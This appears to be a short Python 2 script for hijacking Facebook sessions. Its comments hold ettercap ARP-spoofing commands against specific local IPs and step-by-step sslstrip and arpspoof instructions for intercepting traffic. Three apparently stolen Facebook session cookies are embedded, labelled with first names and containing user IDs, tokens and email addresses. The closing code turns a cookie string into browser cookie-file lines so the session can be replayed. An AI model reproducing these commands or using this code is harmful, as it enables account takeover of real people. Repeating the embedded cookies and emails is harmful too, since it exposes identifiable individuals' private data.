# sudo ettercap -TQM arp:remote -i wlan0 /10.0.0.8/ /10.0.0.2/
# ettercap -Tqi wlan0 -l log -M arp:remote /10.0.0.8/ /10.0.0.2/
# ettercap -Tqi wlan0 -l log -M arp:remote /10.0.0.8/ /10.0.0.2/
"""
        1) Flip your machine into forwarding mode (as root):
           echo "1" > /proc/sys/net/ipv4/ip_forward

        2) Setup iptables to intercept HTTP requests (as root):
           iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort> (10000 is default)

        3) Run sslstrip with the command-line options you'd like (see above).
              sslstrip -a -f -k

        4) Run arpspoof to redirect traffic to your machine (as root):
           arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>

    ettercap -T -q -i wlan0
"""

# jei
#s = "datr=1275210015-76c889c3e1e783093c935a8528ae19ae7c48d74e26734b10c77cd; lo=26Rk64BoyIG2j5JUz2eQ3w; lxs=3; lxr=1; c_user=541142137; lxe=mizz.kapitan%40gmail.com; sct=1277541716; sid=2; xs=6a9349dcacee559006cbf6f58efd39b8; x-referer=http%3A%2F%2Fwww.facebook.com%2Fphoto.php%3Fpid%3D1423996%26id%3D1171395830%26fbid%3D1498687665100%23%2Fphoto.php%3Fpid%3D1423993%26id%3D1171395830%26fbid%3D1498687545097; cur_max_lag=2; e=n; lsd=iWR1x"
# mum
#s = "datr=1276187469-aeae9b73f711b7a91f8f9cbfbaa23ae03ffcacddd5fa16ebbfb9a; lo=YTadhKSUu1yUMBSeyy_v5w; lxs=3; lxr=1; locale=en_US; c_user=777715510; lxe=ldt1%40canterbury.ac.uk; sct=1277499658; sid=2; xs=5096af09345db269ad692a08bf8af023"
# farah
#s = "datr=1274892628-ed7732952ee3012630d2fcd4e7975509ebe17ee08efb17d37a182; lo=9rZSFkJW08LKdvDfvsp5lA; lxs=-1; locale=en_US; lxe=lasetra%40hotmail.com; sct=1277483694; presence=DJ277643140BchADhA_2246.channelH1L775130500MF277642830689WMblcPBsndPBbloMbvtP277642830BctP277642434C9V277643140Z56BlcMcvrADrPBtsP277640715QBalAD1O0462820672ADiMflA_5b_22-1_22_5dBall_46lidsA_5b_22-1_22_5dQQQQ; xs=1ae784844ffa49b815887363496f6d00; x-referer=http%3A%2F%2Fwww.facebook.com%2F%3Fref%3Dhome%23%2F%3Fref%3Dhome; e=n; c_user=775130500; lsd=Z-qiw; cur_max_lag=2"

s = [x.split("=") for x in s.split("; ")]
for key, val in s:
    print ".facebook.com\tFALSE\t/\tFALSE\t0\t"+key+"\t"+val
